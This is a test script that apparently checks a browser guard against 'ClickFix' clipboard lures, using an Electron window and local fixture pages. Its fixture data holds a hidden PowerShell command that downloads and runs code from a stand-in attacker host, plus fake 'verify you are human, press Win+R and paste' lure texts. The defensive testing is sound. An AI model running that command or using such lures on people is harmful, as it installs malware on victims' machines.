'use strict';
// Real Chromium documents exercise the guard through owned clipboard transports. No shared OS clipboard or visible window.
const http=require('node:http'),path=require('node:path'),os=require('node:os');
const {app,BrowserWindow}=require('electron'),{pageScript}=require('../../../desktop/browser-services/page-risk.cjs');
app.setPath('userData',path.join(os.tmpdir(),'acira-page-risk-'+process.pid));
const CMD='powershell -w hidden -c "iex (irm http://evil.example/a)"',NPM='npm install react';
const cases=[
 ['lure','Verify you are human. Press Win+R, then paste with Ctrl+V and press Enter to fix the browser error.',CMD],
 ['lureTerminal','How to fix: open a terminal, press Ctrl+V to paste the command, then run it to verify you are not a robot.',CMD],
 ['lureNpm','Verify you are human. Press Win+R, then paste with Ctrl+V and press Enter to fix the browser error.',NPM],
 ['docsCommand','Administrator documentation: deployment options for managed devices.',CMD],
 ['winrDocsNpm','Press Win+R and type notepad to open Notepad. Windows key plus R opens the Run dialog.',NPM],
 ['winrDocsCommand','Press Win+R and type notepad to open Notepad. Windows key plus R opens the Run dialog.',CMD],
];
const out={};let done=false,win;
function documentFor([name,text,command]){return `<!doctype html><title>Owned guard fixture</title><p>${text}</p><textarea id=t></textarea><script>
window.__fixtureClipboard='before';window.__reports=0;
class OwnedClipboard {writeText(text){window.__fixtureClipboard=String(text);return Promise.resolve();}}
Object.defineProperty(navigator,'clipboard',{configurable:true,value:new OwnedClipboard()});
Object.defineProperty(Document.prototype,'execCommand',{configurable:true,writable:true,value:function(name){if(String(name).toLowerCase()!=='copy')return false;const field=document.activeElement;window.__fixtureClipboard=field&&/^(INPUT|TEXTAREA)$/.test(field.tagName)?field.value.slice(field.selectionStart||0,field.selectionEnd||0):String(getSelection());return true;}});
${pageScript()}
window.addEventListener('acira-clickfix',()=>window.__reports++);
(async()=>{const command=${JSON.stringify(command)},result={};try{await navigator.clipboard.writeText(command);result.writeText='ok';}catch(error){result.writeText=error.name;}
const field=document.getElementById('t');field.value=command;field.focus();field.select();result.execCommand=document.execCommand('copy');const holder=new DataTransfer();holder.setData('text/plain',command);result.dataTransfer=holder.getData('text/plain')===command?'set':'blocked';result.clipboard=window.__fixtureClipboard;result.reports=window.__reports;await fetch('/report?name='+encodeURIComponent(${JSON.stringify(name)})+'&data='+encodeURIComponent(JSON.stringify(result)));})().catch(error=>fetch('/failure?message='+encodeURIComponent(String(error))));</script>`;}
const server=http.createServer((req,res)=>{const u=new URL(req.url,'http://local');if(u.pathname==='/report'){out[u.searchParams.get('name')]=JSON.parse(u.searchParams.get('data'));res.end('ok');return;}if(u.pathname==='/failure'){finish(Error(u.searchParams.get('message')));return;}const item=cases.find(([name])=>'/'+name===u.pathname);res.setHeader('content-type','text/html');res.statusCode=item?200:404;res.end(item?documentFor(item):'not found');});
function finish(error){if(done)return;done=true;clearTimeout(deadline);if(error)process.stdout.write('ERROR '+String(error.stack||error)+'\n');else process.stdout.write('RESULT '+JSON.stringify(out)+'\n');win?.destroy();server.close();app.exit(error?1:0)}
const deadline=setTimeout(()=>finish(Error('Owned page-risk fixture deadline')),20000);process.on('uncaughtException',finish);process.on('unhandledRejection',finish);
app.whenReady().then(async()=>{await new Promise(resolve=>server.listen(0,'127.0.0.1',resolve));const base='http://127.0.0.1:'+server.address().port;win=new BrowserWindow({show:false,width:600,height:400,webPreferences:{sandbox:true,contextIsolation:true}});
for(const[name]of cases){await win.webContents.loadURL(base+'/'+name);for(let i=0;i<300&&!out[name];i++)await new Promise(resolve=>setTimeout(resolve,10));if(!out[name])throw Error('Missing result: '+name);}finish();}).catch(finish);
